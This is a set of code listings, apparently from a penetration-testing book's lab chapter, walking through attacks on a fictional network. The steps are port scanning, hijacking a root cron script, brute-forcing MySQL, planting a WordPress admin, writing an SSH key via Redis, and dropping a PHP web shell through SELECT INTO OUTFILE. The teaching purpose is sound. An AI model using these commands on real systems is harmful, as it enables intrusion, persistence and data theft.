["```\n$ **grep -w -e 3306/tcp -e 3389/tcp -e 22/tcp -e 23/tcp -e 25/tcp /etc/services**\n\nssh                22/tcp          # SSH Remote Login Protocol\ntelnet             23/tcp\nsmtp               25/tcp          mail\nmysql            3306/tcp\nms-wbt-server    3389/tcp \n```", "```\n#!/bin/bash\nTARGETS=(\"$@\") ❶\n\nprint_help(){\n  echo \"Usage: ${0} <LIST OF IPS>\"\n  echo \"${0} 10.1.0.1 10.1.0.2 10.1.0.3\"\n}\n\nif [[${#TARGETS[@]} -eq 0]]; then ❷\n  echo \"Must provide one or more IP addresses!\"\n  print_help ❸\n  exit 1\nfi\n\nfor target in \"${TARGETS[@]}\"; do ❹\n  while read -r port; do\n    if timeout 1 nc -i 1 \"${target}\" -v \"${port}\" 2>&1 | grep -q \"Connected to\"; then ❺\n      echo \"IP: ${target}\"\n      echo \"Port: ${port}\"\n      echo \"Service: $(grep -w \"${port}/tcp\" /etc/services | awk '{print $1}')\"\n    fi\n  done < <(grep \"/tcp\" /etc/services | awk '{print $2}' | tr -d '/tcp') ❻\ndone \n```", "```\n$ **./port_scan_etc_services.sh 10.1.0.13 10.1.0.14**\n\nIP: 10.1.0.13\nPort: 8080\nService: http-alt\nIP: 10.1.0.14\nPort: 22\nService: ssh\nIP: 10.1.0.14\nPort: 6379\nService: redis \n```", "```\n$ **echo -e '\\nINFO' | nc -v 10.1.0.14 6379**\n\n`--snip--`\nNcat: (https://nmap.org/ncat)\nNcat: Connected to 10.1.0.14:6379.\n$3249\n# Server\nredis_version:5.0.6\nredis_git_sha1:00000000\nredis_git_dirty:0\nredis_build_id:24cefa6406f92a1f\nredis_mode:standalone\nos:Linux 6.1.0-kali5-amd64 x86_64\narch_bits:64\nmultiplexing_api:epoll\natomicvar_api:atomic-builtin\n`--snip--` \n```", "```\n$ **grep -w -e 22/tcp -e 23/tcp -e 3306/tcp -e 1433/tcp /usr/share/nmap/nmap-services**\n\nssh         22/tcp      0.182286    # Secure Shell Login\ntelnet      23/tcp      0.221265\nms-sql-s    1433/tcp    0.007929    # Microsoft-SQL-Server\nmysql       3306/tcp    0.045390 \n```", "```\n$ **grep \"/tcp\" /usr/share/nmap/nmap-services | sort -r -k 3 | awk '{print $1, $2, $3}'**\n\nhttp 80/tcp 0.484143\ntelnet 23/tcp 0.221265\nhttps 443/tcp 0.208669\nftp 21/tcp 0.197667\nssh 22/tcp 0.182286\nsmtp 25/tcp 0.131314\nms-wbt-server 3389/tcp 0.083904\npop3 110/tcp 0.077142\nmicrosoft-ds 445/tcp 0.056944\nnetbios-ssn 139/tcp 0.050809\n`--snip--` \n```", "```\n$ **./port_scan_with_frequency.sh 10.1.0.13 10.1.0.14 10.1.0.15 10.1.0.16**\n\nIP: 10.1.0.13\nPort: 8080\nService: http-alt\nIP: 10.1.0.14\nPort: 6379\nService: redis\nIP: 10.1.0.15\nPort: 80\nService: http\nIP: 10.1.0.16\nPort: 3306\nService: mysql \n```", "```\n$ **df -hTP | grep \"/mnt/scripts\"**\n/dev/sda1      ext4      79G   26G   50G  34% /mnt/scripts\n\n$ **mount | grep \"/mnt/scripts\"**\n/dev/sda1 on /mnt/scripts type ext4 (rw,relatime,errors=remount-ro) \n```", "```\n#!/bin/bash\n\n# This script is executed every minute on c-backup-01 to do maintenance work.\n\n❶ LOG=\"/tmp/job.log\"\n\necho \"$(date) - Starting cleanup script...\" >> \"$LOG\"\n❷ if find /tmp -type f ! -name 'job.log' -exec rm -rf {} +; then\n❸ echo \"cleaned up files from the /tmp folder.\"  >> \"$LOG\"\nfi\n\necho \"$(date) - Cleanup script is finished.\" >> \"$LOG\" \n```", "```\ntouch \"/mnt/scripts/$(hostname).txt\"\n```", "```\n$ **watch -d 'ls -l'**\n\nEvery 2.0s: ls -l     p-web-01.acme-infinity-servers.com: Sat\n\ntotal 8\n-rw-r--r-- 1 root root 0 Nov 4 18:13 c-backup-01.acme-infinity-servers.com.txt\n-rwxr--r-- 1 root root 529 Nov 4 18:08 execute.sh \n```", "```\necho \"Hostname: $(hostname)\" > /mnt/scripts/$(hostname).txt\necho \"Identity: $(id)\" >> /mnt/scripts/$(hostname).txt\necho \"Processes: $(ps aux)\" >> /mnt/scripts/$(hostname).txt \n```", "```\n$ **cat /mnt/scripts/c-backup-01***\n\nHostname: c-backup-01.acme-infinity-servers.com\nIdentity: uid=0(root) gid=0(root) groups=0(root)\nProcesses:\nUSER     PID   %CPU %MEM  VSZ   RSS TTY  STAT START TIME COMMAND\n`--snip--`\nroot     1812  0.0  0.0   2732   924 ?   Ss 18:23  0:00 /bin/sh -c bash /mnt/scripts/execute.sh\nroot     1813  0.0  0.0   4244  3196 ?   S  18:23  0:00 bash /mnt/scripts/execute.sh\nroot     1823  0.0  0.0   8204  4000 ?   R  18:23  0:00 ps aux \n```", "```\n$ **nc -v 10.1.0.16 3306**\n\nNcat: Connected to 10.1.0.16:3306.\n5.5.5-10.6.4-MariaDB-1:10.6.4 \n```", "```\n$ **ssh -v -N -L 3306:10.1.0.16:3306 backup@172.16.10.13**\n```", "```\n$ **netstat -atunp | grep 3306**\n\n`--snip--`\ntcp   0   0 127.0.0.1:3306   0.0.0.0:*   LISTEN 86790/ssh\n`--snip—` \n```", "```\n$ **medusa -h 127.0.0.1 -u root -P /usr/share/metasploit-framework/data/**\n**wordlists/unix_users.txt -M mysql** \n```", "```\n`--snip--`\nACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: redsocks\nACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: rfindd\nACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: rje\nACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: root\n**ACCOUNT FOUND: [mysql] Host: 127.0.0.1 User: root Password: root [SUCCESS]** \n```", "```\n$ **mysql -h 127.0.0.1 -u root -p**\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 32\n`--snip--`\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> \n```", "```\n$ MariaDB [(none)]> **show databases;**\n\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n| **wordpress**          |\n+--------------------+ \n```", "```\nMariaDB [(none)]> **use wordpress;**\n\n`--snip--`\nDatabase changed \n```", "```\nMariaDB [(none)]> **INSERT INTO `wordpress`.`wp_users` (**\n**`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`,**\n**`user_activation_key`, `user_status`, `display_name`) VALUES ('3', 'jane', MD5('bash'),**\n**'Jane', 'jane@example.com', 'http://www.example.com/', '2023-01-01 00:00:00', '', '0', 'Jane');** \n```", "```\nMariaDB [(none)]> **INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`,**\n**`meta_value`) VALUES (NULL, '3', 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');**\n\n**MariaDB [(none)]> INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`,**\n**`meta_value`) VALUES (NULL, '3', 'wp_user_level', '10');** \n```", "```\n#!/bin/bash\nDB_HOST=\"127.0.0.1\"\nDB_USER=\"root\"\nDB_NAME=\"wordpress\"\n\n# SQL commands as input to the mysql command\nmysql -h \"${DB_HOST}\" -u \"${DB_USER}\" -p \"${DB_NAME}\" << \"EOF\"\nINSERT INTO `wordpress`.`wp_users` ...\nINSERT INTO `wordpress`.`wp_usermeta` ...\nEOF \n```", "```\n$ **ssh -v -N -L 6379:10.1.0.14:6379 backup@172.16.10.13**\n```", "```\n$ **netstat -atunp | grep 6379**\n```", "```\n$ **redis-cli -h 127.0.0.1 -p 6379**\n```", "```\n127.0.0.1:6379> **CONFIG SET dir /root/.ssh/**\nOK \n```", "```\n127.0.0.1:6379> **CONFIG SET dbfilename authorized_keys**\nOK \n```", "```\n127.0.0.1:6379> **SET k1 \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqfvIYYTDy**\n**Dr98DoutM74ThhUb+72vUDdhRl6Y+CKx3BksVTQ7pIWayRdUaUz/LDH2/ijYGTRcf6juv3yZB5V82x**\n**PbL/ApvKMFwaxrnipZEPOd4BI7EG32XBy5RhIxZXMoUrxtoiJ9QbeRJh6gw0o85ABJhFCbknhxQR14**\n**uiKN7cGaE/XtVBpUiEONczEaUHlJMq6GB/SSIrEXY4iP2p9TUwv0HbljVdE+nOdeKTUINNcnLAbvC6**\n**/dHwLJ/NAQ94Ch+eiGdQHauBBeO96JHtDlgYaz1/sq54FTYYJxci4fiDBmXGAG6xf34f9uyy7PugWd**\n**sr5O0XR/xRJAcGn2/CGil/wIa09YtpcrkEryO0p+WUg7no3PAuotcC/fgDSFAIZnLFFKUtmWJlXMjX**\n**wtOWn9hj61Mk5mT0VlkWopDnVsqXgKfHmWIJolZNdUBW/UHs4nAP+MUOOnNadxlZkKfKdzsaZHhVLM**\n**CLoS+IXVKIvMf6tiLuS5LLut6e1Y2wiQmOM= kali@kali\\n\\n\"**\nOK \n```", "```\n127.0.0.1:6379> **SAVE**\nOK \n```", "```\n$ **ssh -v -N -L 2222:10.1.0.14:22 backup@172.16.10.13**\n```", "```\n$ **netstat -atunp | grep 2222**\n```", "```\n$ **ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa**\n\nLinux c-redis-01.acme-infinity-servers.com 6.1.0-kali5-amd64 #1 SMP\n\n`--snip--`\nroot@c-redis-01:~# \n```", "```\n$ **msfconsole**\n```", "```\nmsf > **use auxiliary/scanner/redis/file_upload**\n```", "```\nmsf auxiliary(scanner/redis/file_upload) > **show options**\n\nModule options (auxiliary/scanner/redis/file_upload):\n\nName                    Current Setting  Required  Description\n----                    ---------------  --------  -----------\nDISABLE_RDBCOMPRESSION  true             yes       Disable compression when saving if found...\nFLUSHALL                false            yes       Run flushall to remove all redis data be...\n**LocalFile                                no        Local file to be uploaded**\nPASSWORD                foobared         no        Redis password for authentication test\n**RHOSTS                                   yes       The target host(s), see https://docs.**\n **metasploit.com/docs/using-metasploit/**\n **basics/using-metasploit.html**\nRPORT                   6379             yes       The target port (TCP)\n**RemoteFile                               no        Remote file path**\nTHREADS                 1                yes       The number of concurrent threads \n```", "```\nmsf auxiliary(scanner/redis/file_upload) > **set LocalFile \"/home/kali/.ssh/id_rsa.pub\"**\nLocalFile => /home/kali/.ssh/id_rsa.pub\n\nmsf auxiliary(scanner/redis/file_upload) > **set RemoteFile  \"/root/.ssh/authorized_keys\"**\nRemoteFile => /root/.ssh/authorized_keys\n\nmsf auxiliary(scanner/redis/file_upload) > **set RHOSTS 127.0.0.1**\nRHOSTS => 127.0.0.1 \n```", "```\nmsf auxiliary(scanner/redis/file_upload) > **run**\n\n[+] 127.0.0.1:6379 - 127.0.0.1:6379  -- saved 564 bytes inside of redis DB at\n/root/.ssh/authorized_keys\n[*] 127.0.0.1:6379 - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed \n```", "```\n$ **ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa**\n```", "```\n$ **ssh -v -N -L 8888:10.1.0.15:80 backup@172.16.10.13**\n```", "```\n$ **netstat -atunp | grep 8888**\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\n\ntcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1151064/ssh\n`--snip--` \n```", "```\n$ **dirsearch -u http://localhost:8888**\n\n`--snip--`\n[21:30:47] 403 -  276B  - /.ht_wsr.txt\n[21:30:47] 403 -  276B  - /.htaccess.sample\n[21:30:47] 403 -  276B  - /.htaccess.save\n[21:30:48] 403 -  276B  - /.html\n[21:30:48] 403 -  276B  - /.htpasswds\n[21:30:48] 403 -  276B  - /.httr-oauth\n[21:30:48] 403 -  276B  - /.php\n**[21:30:58] 200 -   4KB  - /adminer.php**\n**[21:31:05] 200 -  181B  - /database.sql**\n**[21:31:10] 200 -  10KB  - /index.html**\n[21:31:22] 403 -  276B  - /server-status/\n[21:31:22] 403 -  276B  - /server-status\n[21:32:26] 301 -  315B  - /uploads  ->  http://localhost:8888/uploads/\n**[21:32:27] 200 -  941B  - /uploads/** \n```", "```\n$ **curl http://127.0.0.1:8888/database.sql -o database.sql**\n```", "```\n$ **cat database.sql**\nCREATE DATABASE IF NOT EXISTS adminer_db; ❶\nCREATE USER IF NOT EXISTS 'adminer_user'@'localhost' IDENTIFIED BY 'P@ssword321'; ❷\nGRANT ALL ON *.* TO 'adminer_user'@'localhost'; ❸ \n```", "```\nSELECT * FROM acme_hyper_branding;\nSELECT * FROM acme_impact_alliance; \n```", "```\nid,first_name,last_name,designation,email,password\n1,Jacob,Taylor,Founder,jtaylor@acme-hyper-branding.com,carmen\n2,Sarah,Lewish,Executive Assistant,slewis@acme-hyper-branding.com,cachepot\n`--snip--`\n6,Melissa,Rogers,Software Engineer,mrogers@acme-hyper-branding.com,melissa2go \n```", "```\n**SELECT \"test_write1\" into OUTFILE \"file_write1.txt\"**\n```", "```\n**SELECT \"test_write2\" into OUTFILE \"/var/www/html/file_write2.txt\"**\n```", "```\n**SELECT \"test_write3\" into OUTFILE \"/var/www/html/uploads/file_write3.txt\"**\n```", "```\n**SELECT \"<?php system($_GET['cmd']); ?>\" into OUTFILE \"/var/www/html/uploads/s.php\"**\n```", "```\n$ **curl http://localhost:8888/uploads/s.php?cmd=id**\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data) \n```"]